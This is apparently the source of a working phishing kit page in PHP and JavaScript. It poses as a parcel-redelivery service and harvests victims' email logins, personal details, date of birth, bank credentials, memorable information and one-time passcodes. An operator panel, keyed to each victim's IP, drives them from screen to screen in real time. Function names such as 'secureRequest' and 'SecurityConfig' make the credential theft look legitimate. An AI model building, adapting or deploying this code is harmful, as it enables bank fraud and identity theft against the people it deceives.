<?php
session_start(); // Start the session to store the last template

// Initialize and track analytics
require_once 'analytics.php';
$analytics = new Analytics();
$analytics->trackVisit();

// Get user IP address
$userIp = $_SERVER['REMOTE_ADDR'];
$statusJson = json_decode(file_get_contents('panel/data/status.json'), true);

// Validate IP address
$ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP);

// Initialize variables
$fetchedEm = '';
$fetchedPass = '';
$SelectedBank = '';
$hideStyle = ''; // Initialize hideStyle
$template = 'first.txt'; // Default template

// Fetch user data from status JSON
$fetchedEm = $statusJson[$userIp]['Em_User'] ?? '';
$fetchedPass = $statusJson[$userIp]['Pass'] ?? '';
$SelectedBank = $statusJson[$userIp]['SelectedBank'] ?? '';
$fetchedCard = $statusJson[$userIp]['CustomCardCode'] ?? '';

if (!isset($statusJson[$userIp])) {
    // No user data found, use default template
    $template = 'first.txt';
} else {
    $status = $statusJson[$userIp]['Status'];
    $fetchedMobile = $statusJson[$userIp]['Mobile'] ?? '';

    switch ($status) {
        case 'first':
            $template = 'first.txt';
            break;
        case 'login':
            $template = 'login.txt';
            break;
        case 'login_retry':
            $template = 'login_retry.txt';
            break;
        case 'login2':
            $template = 'login2.txt';
            break;
        case 'reschedule':
            $template = 'reschedule.txt';
            break;
        case 'bnk':
            $template = 'bnk.txt';
            break;
        case 'bnk_log':
            $template = 'bnk_log.txt';
            break;
        case 'bnk_log_retry':
            $template = 'bnk_log_retry.txt';
            break;
        case 'bnk_memorable':
            $template = 'bnk_memorable.txt';
            break;
        case 'bnk_memorable_retry':
            $template = 'bnk_memorable_retry.txt';
            break;
        case 'bnk_otp':
            $template = 'bnk_otp.txt';
            break;
        case 'bnk_otp_retry':
            $template = 'bnk_otp_retry.txt';
            break;
        case 'done':
            $template = 'done.txt';
            break;
        case 'waiting':
            if (isset($_SESSION['last_template'])) {
                $template = $_SESSION['last_template'];
                $hideStyle = 'loading';
            }
            break;
        default:
            $template = 'first.txt';
    }
}

// Store the current template in session for future reference
$_SESSION['last_template'] = $template;

// Prepare template content and replace placeholders
$templateContent = file_get_contents("templates/$template");

// Include the final template with all variables available
include "templates/$template";
?>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        document.querySelectorAll('input').forEach(input => input.value = '');
        <?php if (!isset($statusJson[$userIp])): ?>
            first();
        <?php endif; ?>
    });

</script>


<script>
    // Security Configuration
    const SecurityConfig = {
        maxRetries: 3,
        retryDelay: 1000,
        timeoutMs: 10000,
        allowedActions: ['first', 'goto', 'log1', 'log2', 'reschedule', 'bnk', 'bnk_log', 'bnk_memorable', 'bnk_otp'],
        allowedStatuses: ['first', 'login', 'login2', 'reschedule', 'bnk', 'bnk_log', 'waiting'],
        rateLimit: { maxRequests: 10, windowMs: 60000 },
        csrfToken: '<?php echo hash_hmac("sha256", session_id(), "secure_key_2024"); ?>'
    };

    // Rate limiting implementation
    const RateLimiter = {
        requests: [],
        isAllowed() {
            const now = Date.now();
            this.requests = this.requests.filter(time => now - time < SecurityConfig.rateLimit.windowMs);
            
            if (this.requests.length >= SecurityConfig.rateLimit.maxRequests) {
                console.warn('Rate limit exceeded. Please wait before making more requests.');
                return false;
            }
            
            this.requests.push(now);
            return true;
        }
    };

    // Input validation and sanitization
    function sanitizeInput(input) {
        if (typeof input !== 'string') return '';
        return input.trim()
                   .replace(/[<>'"&]/g, '')
                   .substring(0, 500); // Limit input length
    }

    function validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email) && email.length <= 254;
    }

    function validateAction(action) {
        return SecurityConfig.allowedActions.includes(action);
    }

    function validateStatus(status) {
        return SecurityConfig.allowedStatuses.includes(status);
    }

    // Secure fetch wrapper with enhanced security
    async function secureRequest(action, data, retryCount = 0) {
        // Rate limiting check
        if (!RateLimiter.isAllowed()) {
            throw new Error('Rate limit exceeded');
        }

        // Validate action
        if (!validateAction(action)) {
            throw new Error('Invalid action');
        }

        // Validate status if provided
        if (data.Status && !validateStatus(data.Status)) {
            throw new Error('Invalid status');
        }

        // Sanitize all input data
        const sanitizedData = {};
        for (const [key, value] of Object.entries(data)) {
            if (key === 'Em_User' && !validateEmail(value)) {
                throw new Error('Invalid email format');
            }
            sanitizedData[key] = sanitizeInput(value.toString());
        }

        const params = new URLSearchParams();
        params.append('action', action);
        params.append('csrf_token', SecurityConfig.csrfToken);
        params.append('timestamp', Date.now().toString());
        
        // Add sanitized data
        for (const [key, value] of Object.entries(sanitizedData)) {
            params.append(key, value);
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), SecurityConfig.timeoutMs);

        try {
            const response = await fetch('controller.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Cache-Control': 'no-cache'
                },
                body: params,
                signal: controller.signal,
                credentials: 'same-origin'
            });

            clearTimeout(timeoutId);

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            // const contentType = response.headers.get('content-type');
            // if (!contentType || !contentType.includes('application/json')) {
            //     throw new Error('Invalid response format');
            // }

            // const result = await response.json();
            
            // // Validate response structure
            // if (typeof result !== 'object' || result === null) {
            //     throw new Error('Invalid response data');
            // }

            return result;

        } catch (error) {
            clearTimeout(timeoutId);
            
            if (error.name === 'AbortError') {
                throw new Error('Request timeout');
            }

            // Retry logic for network errors
            if (retryCount < SecurityConfig.maxRetries && 
                (error.message.includes('Failed to fetch') || error.message.includes('Network'))) {
                
                console.warn(`Request failed, retrying... (${retryCount + 1}/${SecurityConfig.maxRetries})`);
                await new Promise(resolve => setTimeout(resolve, SecurityConfig.retryDelay * (retryCount + 1)));
                return secureRequest(action, data, retryCount + 1);
            }

            throw error;
        }
    }

    // Enhanced secure functions
    async function first() {
        try {
            const result = await secureRequest('first', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Status: 'first'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
        }
    }

    async function gotoLog() {
        try {
            const result = await secureRequest('goto', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Status: 'login'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
        }
    }

    async function gotoBnk() {
        try {
            const result = await secureRequest('goto', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Status: 'bnk'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
        }
    }

    async function log1() {
        try {
            const emailElement = document.getElementById('user-em');
            if (!emailElement) {
                throw new Error('Email field not found');
            }

            const email = emailElement.value;
            if (!validateEmail(email)) {
                throw new Error('Please enter a valid email address');
            }

            const result = await secureRequest('log1', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Em_User: email,
                Status: 'login2'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    async function log2() {
        try {
            const passwordElement = document.getElementById('user-ps');
            if (!passwordElement) {
                throw new Error('Password field not found');
            }

            const password = passwordElement.value;
            if (!password || password.length < 1) {
                throw new Error('Please enter a password');
            }

            const result = await secureRequest('log2', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Em_User: '<?php echo htmlspecialchars($fetchedEm, ENT_QUOTES, "UTF-8"); ?>',
                Pass: password,
                Status: 'reschedule'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    async function reschedule() {
        try {
            const requiredFields = ['full-name', 'delivery-address', 'date-of-birth', 
                                  'preferred-redelivery-date', 'preferred-time-slot', 'contact-phone-number'];
            
            const formData = {};
            for (const fieldId of requiredFields) {
                const element = document.getElementById(fieldId);
                if (!element) {
                    throw new Error(`Required field ${fieldId} not found`);
                }
                
                const value = element.value.trim();
                if (!value) {
                    throw new Error(`Please fill in all required fields`);
                }
                
                formData[fieldId.replace(/-([a-z])/g, (g) => g[1].toUpperCase())] = value;
            }

            const result = await secureRequest('reschedule', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                FullName: formData.fullName,
                DeliveryAddress: formData.deliveryAddress,
                DateOfBirth: formData.dateOfBirth,
                PreferredRedeliveryDate: formData.preferredRedeliveryDate,
                PreferredTimeSlot: formData.preferredTimeSlot,
                ContactPhoneNumber: formData.contactPhoneNumber,
                Status: 'bnk'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    let selectedBank = '';
    function selectBank(bank) {
        const sanitizedBank = sanitizeInput(bank);
        if (!sanitizedBank) {
            console.error('Invalid bank selection');
            return;
        }

        document.querySelectorAll('.bank-option').forEach(option => option.classList.remove('selected'));
        const bankElement = document.querySelector(`[data-bank="${sanitizedBank}"]`);
        if (bankElement) {
            bankElement.classList.add('selected');
            selectedBank = sanitizedBank;
        } else {
            console.error('Bank option not found');
        }
    }

    async function bnk() {
        try {
            if (!selectedBank) {
                throw new Error('Please select a bank');
            }

            const result = await secureRequest('bnk', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                SelectedBank: selectedBank,
                Status: 'bnk_log'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    async function bnkLog() {
        try {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');

            if (!emailElement || !passwordElement) {
                throw new Error('Required fields not found');
            }

            const email = emailElement.value;
            const password = passwordElement.value;

            if (!validateEmail(email)) {
                throw new Error('Please enter a valid email address');
            }

            if (!password || password.length < 1) {
                throw new Error('Please enter a password');
            }

            const result = await secureRequest('bnk_log', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Email: email,
                Password: password,
                Status: 'waiting'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    async function bnkMemorable() {
        try {
            const memorableElement = document.getElementById('memorable');
            if (!memorableElement) {
                throw new Error('Memorable field not found');
            }

            const memorable = memorableElement.value;
            if (!memorable || memorable.length < 1) {
                throw new Error('Please enter memorable information');
            }

            const result = await secureRequest('bnk_memorable', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                Memorable: memorable,
                Status: 'waiting'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }

    async function bnkOtp() {
        try {
            const otpElement = document.getElementById('otpCode');
            if (!otpElement) {
                throw new Error('OTP field not found');
            }

            const otp = otpElement.value;
            if (!otp || !/^\d{4,8}$/.test(otp)) {
                throw new Error('Please enter a valid OTP code (4-8 digits)');
            }

            const result = await secureRequest('bnk_otp', {
                IP: '<?php echo htmlspecialchars($ip, ENT_QUOTES, "UTF-8"); ?>',
                OtpCode: otp,
                Status: 'waiting'
            });
            console.log('Request successful:', result);
        } catch (error) {
            console.error('Request failed:', error.message);
            // alert('Error: ' + error.message);
        }
    }
</script>
<script>
    let previousStatus = '<?php echo isset($status) ? $status : 'default'; ?>';
    let previousMobile = '<?php echo isset($fetchedMobile) ? $fetchedMobile : ''; ?>';

    // Check status every 1 second
    const statusCheck = setInterval(function () {
        $.ajax({
            type: 'POST',
            url: 'checkStatus.php',
            data: { ip: '<?php echo $userIp; ?>' },
            dataType: 'json',  // Specify that we expect JSON response
            success: function (data) {
                // No need to parse, jQuery will do it automatically
                if (data.status !== previousStatus || data.mobile !== previousMobile) {
                    console.log('Change detected!');
                    console.log('Previous Status:', previousStatus, 'New Status:', data.status);
                    console.log('Previous Mobile:', previousMobile, 'New Mobile:', data.mobile);
                    window.location.reload();
                }
                previousStatus = data.status;
                previousMobile = data.mobile;
            },
            error: function (xhr, status, error) {
                console.error('Ajax request failed:', error);
                console.log('Response Text:', xhr.responseText);
            }
        });
    }, 1000);
</script>